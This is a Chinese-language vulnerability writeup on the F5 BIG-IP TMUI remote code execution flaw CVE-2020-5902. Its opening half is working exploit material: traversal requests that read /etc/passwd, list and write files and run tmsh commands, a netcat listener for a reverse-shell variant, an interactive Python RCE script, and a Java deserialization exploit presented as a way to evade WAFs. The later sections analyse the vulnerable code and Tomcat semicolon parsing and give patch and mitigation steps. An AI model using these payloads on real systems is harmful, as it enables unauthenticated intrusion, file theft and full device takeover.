## F5 BIG-IP 远程代码执行漏洞（CVE-2020-5902） {docsify-ignore}

编辑：[@r4v3zn](https://github.com/0nise)

分析作者：[@Jas502n](https://github.com/jas502n)、[@Jayway007](https://github.com/Jayway007)

### Payload

```
GET /tmui/login.jsp/..;/tmui/system/user/authproperties.jsp 
GET /tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=AnyMsgHereWillBeReflectedInTheResponse
```

![](cve-2020-5902/1.png)

任意文件读取

```
GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
```

![](cve-2020-5902/2.png)

列出所有文件：

```
GET /tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/ HTTP/1.1
```

![](cve-2020-5902/4.png)

任意文件写入：

```
GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/balabalabla&content=id11
```

![](cve-2020-5902/5.png)

RCE：

```
GET /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin
```

执行命令：https://devcentral.f5.com/s/question/0D51T00006i7hq9/tmsh-command-to-list-all-users-in-all-partitions

![](cve-2020-5902/3.png)



2020 年 7 月 8 日绕过，通过 hsqldb + 序列化进行绕过补丁，利用方案：

```
nc -l -v -p localport
./CVE-2020-5902.sh <server> <localip> <localport>
```

github：https://github.com/Critical-Start/Team-Ares/tree/master/CVE-2020-5902

**通过bash执行命令的 payload：**

通过 alias = bash 去绕过无法执行 shell 的限制。payload如下

```python
#coding:utf-8
import requests
import json
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import uuid
import sys

# tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
# fileSave.jsp?fileName=/tmp/cmd&content=id
# tmshCmd.jsp?command=list+/tmp/cmd
# tmshCmd.jsp?command=delete+cli+alias+private+list

banner = r'''
 _______  _______    ______  _________ _______   _________ _______    _______  _______  _______
(  ____ \(  ____ \  (  ___ \ \__   __/(  ____ \  \__   __/(  ____ )  (  ____ )(  ____ \(  ____ \
| (    \/| (    \/  | (   ) )   ) (   | (    \/     ) (   | (    )|  | (    )|| (    \/| (    \/
| (__    | (____    | (__/ /    | |   | |           | |   | (____)|  | (____)|| |      | (__
|  __)   (_____ \   |  __ (     | |   | | ____      | |   |  _____)  |     __)| |      |  __)
| (            ) )  | (  \ \    | |   | | \_  )     | |   | (        | (\ (   | |      | (
| )      /\____) )  | )___) )___) (___| (___) |  ___) (___| )        | ) \ \__| (____/\| (____/\
|/       \______/   |/ \___/ \_______/(_______)  \_______/|/         |/   \__/(_______/(_______/
                                                                                                
                        CVE-2020-5902 UnAuth RCE Vuln
                            Python By Jas502n
From: https://github.com/rapid7/metasploit-framework/blob/0417e88ff24bf05b8874c953bd91600f10186ba4/modules/exploits/linux/http/f5_bigip_tmui_rce.rb
____________________________________________________________________________________________________________________________________________________
'''

def tmshCmd_exit(url,file,cmd):
    tmshCmd_url = url + "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash"
    proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}
    r = requests.get(tmshCmd_url,verify=False,allow_redirects=False)
    # r = requests.get(tmshCmd_url,verify=False,allow_redirects=False,proxies=proxies)

    response_str = json.dumps(r.headers.__dict__['_store'])
    # print type(response_str)
    # print response_str
    if r.status_code == 200 and 'tmui' in response_str:
        # print tmshCmd_url
        print "[+] tmshCmd.jsp Exit!"
        print "[+] create cli alias private list command bash \n"
        # cmd = 'whoami'
        upload_exit(url,file,cmd)


    else:
        print "[+] tmshCmd.jsp No Exit!\n"

def upload_exit(url,file,cmd):
    fileSave_url = url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/%s&content="%file + cmd
    proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}
    r = requests.get(fileSave_url,verify=False,allow_redirects=False)
    # r = requests.get(fileSave_url,verify=False,allow_redirects=False,proxies=proxies)
    response_str = json.dumps(r.headers.__dict__['_store'])
    if r.status_code == 200 and 'tmui' in response_str:
        # print fileSave_url
        print "[+] fileSave.jsp Exit!\n"
        list_command(url,file)
    else:
        print "[+] fileSave.jsp No Exit!\n"

def list_command(url,file):
    rce_url = url + "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/%s" % file
    proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}
    r = requests.get(rce_url,verify=False,allow_redirects=False)
    # r = requests.get(rce_url,verify=False,allow_redirects=False,proxies=proxies)
    response_str = json.dumps(r.headers.__dict__['_store'])
    # print len(r.content)
    if r.status_code == 200 and 'tmui' in response_str:
        if len(r.content) > 33:
            # print rce_url
            print "[+] Command Successfull !\n"
            command_result = json.loads(r.content)
            print "_"*90,'\n\n'
            print command_result['output']
            print "_"*90,"\n\n"
            delete_list(url)
    else:
        print "[+] Command Failed !\n"

def delete_list(url):
    delete_url = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list'
    proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}
    r = requests.get(delete_url,verify=False,allow_redirects=False)
    # r = requests.get(delete_url,verify=False,allow_redirects=False,proxies=proxies)
    response_str = json.dumps(r.headers.__dict__['_store'])
    if r.status_code == 200 and 'tmui' in response_str:
        # print delete_url
        print "[+] delete cli alias private list Successfull! \n"
    else:
        print "[+] delete cli alias private list Failed! \n"


if __name__ == '__main__':
    print banner
    while 1:
        url = "https://x.x.x.x/"
        # url = sys.argv[1]
        file = str(uuid.uuid1())
        print "/tmp/" + file,"\n"
        cmd = raw_input("[+]Set Cmd= ")
        print
        tmshCmd_exit(url,file,cmd)
```

**通过 java 反序列化绕过 waf 的 payload ：**

上一种 payload 特征明显，很容易被 waf 等设备拦截。在这里我们可以使用 java 反序列化配合 cve 2020-5902 去执行命令。做到隐藏特征以绕过waf。

```python
/*
 Exploit Title: F5 BIG-IP Remote Code Execution
 Date: 2020-07-06
 Authors: Charles Dardaman of Critical Start, TeamARES
                  Rich Mirch of Critical Start, TeamARES
 CVE: CVE-2020-5902
 Requirements:
   Java JDK
   hsqldb.jar 1.8
   ysoserial https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
*/

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.Statement;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.io.IOException;
import org.hsqldb.lib.StringConverter;

public class f5RCE {

	public static void main(String[] args) {
		Connection connection;
		Statement statement;

		if(args.length != 2) {
			System.err.println("\nUsage: <hostname> <payload.txt>\n");
			System.exit(1);
		}
		String server = args[0];
		String pfile = args[1];
		String payload = null;

		try {
			payload = new String(Files.readAllBytes(Paths.get(pfile)));
			payload = payload.replaceAll("(\\n|\\r)","");
		} catch (IOException e) {
			e.printStackTrace();
		}

		String dburl = "jdbc:hsqldb:https://" + server +
                               ":443/tmui/login.jsp/..%3b/hsqldb/";

		System.out.println("Connecting to " + server);
		try {
			Class.forName("org.hsqldb.jdbcDriver");
			connection = DriverManager.getConnection(dburl, "sa","");
			statement = connection.createStatement();
			statement.execute("call \"java.lang.System.setProperty\"('org.apache.commons.collections.enableUnsafeSerialization','true')");
			statement.execute("call \"org.hsqldb.util.ScriptTool.main\"('" + payload +"');");
		} catch (java.sql.SQLException sqle) {
			// ignore java.sql.SQLException: S1000
			// General error java.lang.IllegalArgumentException: argument type mismatch
			if(sqle.getSQLState().equals("S1000") && sqle.getErrorCode() == 40) {
				System.out.println("Payload executed");
			} else {
				System.out.println("Unexpected SQL error");
				sqle.printStackTrace();
			}
			return;
		}
		catch (ClassNotFoundException cne) {
			System.err.println("Error loading db driver");
			cne.printStackTrace();
			return;
		}
	}
}
```

### 概况

F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。2020 年7 月 1日，F5 公布流量管理用户界面（TMUI），也称为配置实用程序，在未公开的页面中具有远程执行代码（RCE）漏洞，漏洞编号为 CVE-2020-5902。

攻击者可利用该漏洞执行任意的系统命令、创建或删除文件，关闭服务/执行任意的Java代码，可能完全入侵系统，对此漏洞 CVSS 评分 10 分。

### 影响版本

- BIG-IP = 15.1.0
- BIG-IP = 15.0.0
- BIG-IP 14.1.0 - 14.1.2
- BIG-IP 13.1.0 - 13.1.3
- BIG-IP 12.1.0 - 12.1.5
- BIG-IP 11.6.1 - 11.6.5

### 分析过程

漏洞点：

```java
JSONObject resultObject = WorkspaceUtils.runTmshCommand(cmd, request);
```

```java
/usr/local/www/tmui/WEB-INF/lib/tmui.jar/com.f5.tmui.locallb.handler.workspace.WorkspaceUtils#runTmshCommand
```

```java
public static JSONObject runTmshCommand(String command, HttpServletRequest request) {
    F5Logger logger = (F5Logger)F5Logger.getLogger(WorkspaceUtils.class);
    JSONObject resultObject = new JSONObject();
    String output = "";
    String error = "";
    if (!csrfValidated(request.getHeader("_bufvalue"), request.getHeader("_timenow"), request.getHeader("Tmui-Dubbuf"))) {
      logger.warn("Invalid user token - token provided by user is not authorized");
      resultObject.put("output", output);
      resultObject.put("error", NLSEngine.getString("ilx.workspace.error.InvalidUserToken"));
      return resultObject;
    } 
    if ("POST".equalsIgnoreCase(request.getMethod())) {
      String[] cmdArray = command.split(" ");
      String operation = cmdArray[0];
      String module = cmdArray[2];
      if (!ShellCommandValidator.checkForBadShellCharacters(command) && (operation.equals("create") || operation.equals("delete") || operation.equals("list") || operation.equals("modify")) && WHITELISTED_TMSH_MODULES.contains(module)) {
        try {
          String[] args = { command };
          Syscall.Result result = Syscall.callElevated(Syscall.TMSH, args);
          output = result.getOutput();
          error = result.getError();
        } catch (com.f5.tmui.util.Syscall.CallException e) {
          logger.error(NLSEngine.getString("ilx.workspace.error.TmshCommandFailed") + ": " + e.getMessage());
          error = e.getMessage();
        } 
      } else {
        error = NLSEngine.getString("ilx.workspace.error.RejectedTmshCommand");
      } 
    } else {
      error = NLSEngine.getString("ilx.workspace.error.InvalidMethod");
    } 
    resultObject.put("output", output);
    resultObject.put("error", error);
    return resultObject;
}
```

#### “;” 绕过分析

!> 摘自：[CVE-2020-5902——关于;号绕过认证技巧总结](https://mp.weixin.qq.com/s/JnI4f3R5JZqhLFv_fTQ_0A)

在利用的 Payload 中出现了 `..;`，在此之前出现很多认证绕过。

##### 原理解析

HttpServletRequest 中 URL 解析函数主要分为：
```
request.getRequestURL()：返回全路径；
request.getRequestURI()：返回除去Host（域名或IP）部分的路径；
request.getContextPath()：返回工程名部分，如果工程映射为/，则返回为空；
request.getServletPath()：返回除去Host和工程名部分的路径；
request.getPathInfo()：仅返回传递到Servlet的路径，如果没有传递额外的路径信息，则此返回Null
```
漏洞点主要在于 `request.getRequestURL()` 和 `request.getRequestURI()` 中，一般通过 `getRequestURL()` 和 `getRequestURI()` 来进行解析用户请求的 URL，但是如果在请求的 URL 中包含了一些特殊的符号，则可能会造成访问限制绕过的安全风险，其中分号“;”就是其一。

##### Tomcat 的处理方式

1. 分号“;”

在 URL 中遇到“;”号会将“;xxx/”中的分号与斜杠之间的字符串以及分号本身都去掉：

![](cve-2020-5902/7.png)

2. 斜杆“/”

判断是否有连续的/，存在的话则循环删除掉多余的/：

![](cve-2020-5902/8.png)

3. ./和../

将“/./”删除掉，将“/../”进行跨目录拼接处理：

![](cve-2020-5902/9.png)

总结一下，分号可用在两种场景：

```
/;xxx/实现分割目录
/..;/实现跨目录，常用在../被禁用的场景下
;.css或;.js等利用白名单绕过认证鉴权
```

##### 案例

假设 Tomcat 上启动的 Web 目录下存在一个 info 目录，其中有一个 secret.jsp 文件，其中包含敏感信息：

```jsp
<%@ pagecontentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
   <title>Secret</title>
</head>
<body>
username: mi1k7ea<br>
password: 123456<br>
address: china<br>
phone: 13666666666<br>
</body>
</html>
```

新建一个 `filter` 包，其中新建一个 `testFilter` 类，实现 `Filter` 接口类，实现只要访问 `/urltest/info` 目录下的资源，都需要进行权限判断，否则直接放行。

注意这里调用 `getRequestURI()` 函数来获取请求中的URL目录路径，然后调用 `startsWith()` 函数判断是否是访问的敏感目录：

```java
package filter;

import javax.servlet.*;
import javax.servlet.http.*;
import java.io.IOException;

public class testFilter implements Filter {
   @Override
   public void init(FilterConfig filterConfig) throws ServletException {

    }

   @Override
   public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,FilterChain filterChain) throws IOException, ServletException {
       HttpServletRequest httpServletRequest =(HttpServletRequest)servletRequest;
       HttpServletResponse httpServletResponse =(HttpServletResponse)servletResponse;

        String url =httpServletRequest.getRequestURI();

       if (url.startsWith("/urltest/info")) {
           httpServletResponse.getWriter().write("No Permission.");
           return;
       }

       filterChain.doFilter(servletRequest, servletResponse);
    }

   @Override
   public void destroy() {

    }
}
```

编辑 web.xml，添加 testFilter 设置：

```xml
<?xml version="1.0"encoding="UTF-8"?>
<web-appxmlns="http://xmlns.jcp.org/xml/ns/javaee"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaeehttp://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
        version="4.0">
   <filter>
       <filter-name>testFilter</filter-name>
       <filter-class>filter.testFilter</filter-class>
   </filter>
   <filter-mapping>
       <filter-name>testFilter</filter-name>
       <url-pattern>/*</url-pattern>
   </filter-mapping>
</web-app>
```

运行之后，访问 http://localhost:8080/urltest/info/secret.jsp 会显示无权限，可用的绕过方法有下面几种：

```
加/绕过：http://localhost:8080//urltest/info/secret.jsp
跨目录：http://localhost:8080/urltest/anything/../info/secret.jsp
或 http://localhost:8080/urltest/anything/..;/info/secret.jsp
./绕过：http://localhost:8080/urltest/./info/secret.jsp
;绕过：http://localhost:8080/urltest/;anything/info/secret.jsp
```

 

### 靶场

无

### 修复

1. 登陆 TMOS Shell（**tmsh**）执行：

`tmsh`

2. 修改 httpd 配置信息：

```
edit /sys httpd all-properties
```

3. 找到`include` 部分并添加以下内容：

```
include'
<LocationMatch“;”>
Redirect404 /
</ LocationMatch>
'
```

4. 通过输入以下命令，将更改写入并保存到配置文件中：

```
Esc
:wq!
```

5. 通过输入以下命令来保存配置：

```
save /sys config
```

6. 通过输入以下命令来重新启动**httpd**服务：

```
restart sys service httpd
```

也可以通过升级的方式来进行修复：

- BIG-IP 15.x 升级至 15.1.0.4

- BIG-IP 14.x 升级至 14.1.2.6
- BIG-IP 13.x 升级至 13.1.3.4
- BIG-IP 12.x 升级至 12.1.5.2
- BIG-IP 11.x 升级至 11.6.5.2

### 分析文章

- [CVE-2020-5902](https://github.com/jas502n/CVE-2020-5902)
- [CVE-2020-5902——关于;号绕过认证技巧总结](https://mp.weixin.qq.com/s/JnI4f3R5JZqhLFv_fTQ_0A)
- [F5 BIG-IP Remote Code Execution Exploit – CVE-2020-5902](https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/)

### 参考

- https://twitter.com/Nep_1337_1998/status/1279610946864820225
- https://github.com/jas502n/CVE-2020-5902
- [F5 BIG-IP远程代码执行漏洞复现（CVE-2020-5902）](https://mp.weixin.qq.com/s/LczKnV5f7T-0Nw7p4q_0wg)
- [F5 BIG-IP Remote Code Execution Exploit – CVE-2020-5902](https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/)
- [cve-2020-5902 RCE的payload以及绕过方式](https://mp.weixin.qq.com/s/K2lSSih4lD0SwXPNd4yauA)
- [CVE-2020-5902——关于;号绕过认证技巧总结](https://mp.weixin.qq.com/s/JnI4f3R5JZqhLFv_fTQ_0A)